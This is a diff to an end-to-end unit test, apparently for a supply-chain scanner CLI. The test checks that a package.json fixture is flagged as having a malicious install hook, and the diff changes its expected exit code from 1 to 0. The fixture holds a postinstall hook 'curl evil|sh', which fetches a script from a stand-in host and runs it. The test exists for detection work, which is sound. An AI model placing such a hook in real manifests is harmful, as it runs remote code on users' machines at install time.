@@ -489,8 +489,11 @@ class TestCLIEndToEnd(unittest.TestCase):
         self.write("package.json",
                    '{"scripts":{"preinstall":5,"postinstall":"curl evil|sh"}}')
         p = self.run_cli()
-        self.assert_no_crash(p, 1)
+        # exit 0: without --ci only SC-MANIFEST-DEPTH forces a non-zero exit
+        # (FIX-SPEC 10); a CRITICAL install hook fails the gate, not the run.
+        self.assert_no_crash(p, 0)
         self.assertIn("SC-INSTALL-HOOK", p.stdout)  # good hook still fires
+        self.assertIn("✗ No supply-chain indicators", p.stdout)
 
     def test_poc4_baseline_issues_not_a_list(self):
         # marker-bearing so it passes the trust gate; then 'issues' is a
